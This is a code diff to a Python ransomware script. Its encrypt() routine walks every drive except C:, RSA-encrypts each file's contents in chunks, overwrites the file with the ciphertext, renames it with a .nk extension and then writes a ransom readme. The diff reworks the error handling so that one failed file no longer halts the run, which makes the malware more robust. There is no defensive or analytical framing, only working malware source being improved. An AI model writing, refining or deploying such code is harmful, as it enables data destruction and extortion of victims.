@@ -12,29 +12,29 @@ def encrypt():
     for part in range(65, 91):
         if part != 67:
             partpath = chr(part) + ":\\"
-            try:
-                for dirpath, dirs, files in os.walk(partpath, topdown = True):
-                    dirpath = dirpath + "\\"
-                    for filename in files:
-                        i = 0
-                        x = {}
-                        fname = dirpath + filename
-                        if filename != "e" + m_id + ".exe":
-                            nfname = fname + ".nk"
-                            os.rename(fname, nfname)
-                            with open(nfname, 'rb') as f:
-                                while True:
-                                    data = f.read(117)
-                                    if data:
-                                        ct = rsa.encrypt(data, rsa.key.PublicKey(n, e))
-                                        x[i] = ct
-                                        i += 1
-                                    else:
-                                        break
-                            with open(nfname, 'wb') as f:
+            for dirpath, dirs, files in os.walk(partpath, topdown = True):
+                dirpath = dirpath + "\\"
+                for filename in files:
+                    i = 0
+                    x = {}
+                    fname = dirpath + filename
+                    if filename != "e" + m_id + ".exe":
+                        nfname = fname + ".nk"
+                        with open(fname, 'rb') as f:
+                            while True:
+                                data = f.read(117)
+                                if data:
+                                    ct = rsa.encrypt(data, rsa.key.PublicKey(n, e))
+                                    x[i] = ct
+                                    i += 1
+                                else:
+                                    break
+                        try:
+                            with open(fname, 'wb') as f:
                                 pickle.dump(x, f)
-            except:
-                pass
+                            os.rename(fname, nfname)
+                        except:
+                            pass
 
 encrypt()
 with open("nk_readme.txt", 'w') as f:
